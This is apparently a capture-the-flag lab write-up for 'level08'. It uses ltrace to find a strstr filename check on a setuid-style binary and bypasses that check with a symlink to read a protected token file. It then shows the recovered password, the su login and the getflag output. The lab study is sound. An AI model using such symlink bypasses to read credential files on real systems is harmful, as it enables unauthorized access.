In the home folder there is a token file, whose contents we can't read, and a binary ./level08 which, if we launch it, displays a message :
<pre><code>> ./level08
./level08 [file to read]
> ./level08 token
You may not access 'token'
</code></pre>

We want to know what the binary does, so we use **ltrace** :
<pre><code>> ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")= "token"
printf("You may not access '%s'\n", "token"You may not access 'token')= 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
</code></pre>
> We observe the <code>strstr("token", "token")= "token"</code> which means that we cannot read the file when it is called "token"

So we create a symbolic link with a different name in order to bypass the verification
<pre><code>> ln -s `pwd`/token /tmp/mdp
./level08 /tmp/mdp
quif5eloekouj29ke0vouxean
</code></pre>

We test the password :
<pre>
<code>> su flag08</code>
<code>Password: quif5eloekouj29ke0vouxean</code>
</pre>

You get the magic phrase **Ne pas oublier de lancer getflag !**

<pre>
<code>> getflag</code>
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
</pre>
